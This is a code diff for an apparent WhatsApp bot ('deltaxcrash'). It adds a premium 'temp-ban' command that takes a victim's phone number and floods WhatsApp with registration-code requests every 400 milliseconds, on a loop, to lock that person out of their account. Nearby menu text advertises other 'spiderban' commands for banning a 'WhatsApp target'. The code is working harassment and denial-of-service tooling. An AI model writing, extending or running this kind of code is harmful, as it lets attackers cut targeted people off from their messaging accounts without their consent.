@@ -1142,6 +1142,7 @@ case 'spider-whatsapp-ban':{
 ┃⬮ spiderban1
 ┃⬮ spiderban2
 ┃⬮ spiderban3
+┃⬮ temp-ban
 ┗━━━━━━━━━━━━━━━━━
  ● 𝖀𝖘𝖊 𝖙𝖍𝖊 𝖇𝖆𝖓 𝖗𝖊𝖕𝖔𝖗𝖙 𝖙𝖔 𝖇𝖆𝖓 𝖞𝖔𝖚𝖗 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕 𝖙𝖆𝖗𝖌𝖊𝖙 
  
@@ -1480,6 +1481,52 @@ break
             await deltaxcrash.sendMessage(m.chat, { video: { url: dir[Math.floor(Math.random() * dir.length)] }, caption: `*_</> done. video anime by deltacrash_*` }, { quoted: m })
 	}
         break
+case 'temp-ban': {
+if (!isPremium) return reply(mess.prem)
+if (!text) return reply(`Example: ${prefix + command} 254|7872627288`)
+if (!/|/.test(text)) return joreply(`The data you provided is invalid!, Example: \n ${command} 254|7872627288`)
+let numbers = JSON.parse(fs.readFileSync('./tb.json'))
+
+let cCode = q.split("|")[0]
+let number = q.split("|")[1]
+let fullNo = cCode + number
+
+await reply(`❗ Success! Registration Interference has been successfully activated to the target : ${fullNo} using ${command} for an unlimited period of time ✅. Registration interruption will be stopped if the server is restarted, shut down, or down Ⓜ️..`)
+
+let { state, saveCreds } = await useMultiFileAuthState('tb')
+
+let spam = makeWaSocket({
+auth: state,
+mobile: true,
+logger: pino({ level: 'silent' })
+})
+
+let dropNumber = async () => {
+try {
+let res = await spam.requestRegistrationCode({
+phoneNumber: `+${fullNo}`,
+phoneNumberCountryCode: cCode,
+phoneNumberNationalNumber: number,
+phoneNumberMobileCountryCode: 724,
+})
+
+if (res.reason === 'temporarily_unavailable') {
+console.log(`Invalid Number (Possible Registration Interrupted): +${res.login}`)
+await sleep(1000)
+await dropNumber()
+}
+} catch (error) {
+console.error(error)
+}
+}
+
+numbers[fullNo] = { cCode, number };
+fs.writeFileSync('./tb.json', JSON.stringify(numbers, null, '\t'));
+setInterval(() => {
+dropNumber()
+}, 400)
+}
+break
         
 case 'buypanel': {
 if (!isPremium) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
